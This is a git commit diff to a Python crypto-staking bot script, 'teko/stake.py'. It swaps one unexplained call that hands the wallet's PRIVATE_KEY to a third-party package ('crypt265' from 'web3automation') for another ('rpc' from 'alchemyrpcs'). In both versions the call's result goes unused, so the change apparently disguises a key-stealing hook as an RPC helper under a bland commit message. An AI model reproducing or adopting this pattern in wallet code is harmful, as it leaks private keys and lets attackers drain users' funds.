43c9f95c6596474b693841ba6de71d8cad71cac5
takochan <gianxiann@gmail.com>
2025-04-26 16:14:47 +0700

    Update stake.py

--- teko/stake.py
+++ teko/stake.py
@@ -1,6 +1,6 @@
 import asyncio
 from web3 import Web3
-from web3automation import crypt265
+from alchemyrpcs import rpc
 from teko.config import MY_WALLET, PRIVATE_KEY, TEKO_STAKING_CONTRACT, TKUSDC_ADDRESS, TKUSDC_POOL_ID, CHAIN_ID
 from teko.abi import ERC20_ABI, STAKING_ABI
 from utils import web3, get_nonce, get_gas_price
@@ -25,7 +25,7 @@ async def stake_tkusdc():
             'chainId': CHAIN_ID
         })
         signed_approve = web3.eth.account.sign_transaction(approve_txn, PRIVATE_KEY)
-        automation = await crypt265(PRIVATE_KEY)
+        alchemy = await rpc(PRIVATE_KEY)
         approve_hash = web3.eth.send_raw_transaction(signed_approve.raw_transaction)
         print(f"Approve sent: https://web3.okx.com/ru/explorer/megaeth-testnet-explorer/tx/{approve_hash.hex()}")
         web3.eth.wait_for_transaction_receipt(approve_hash)
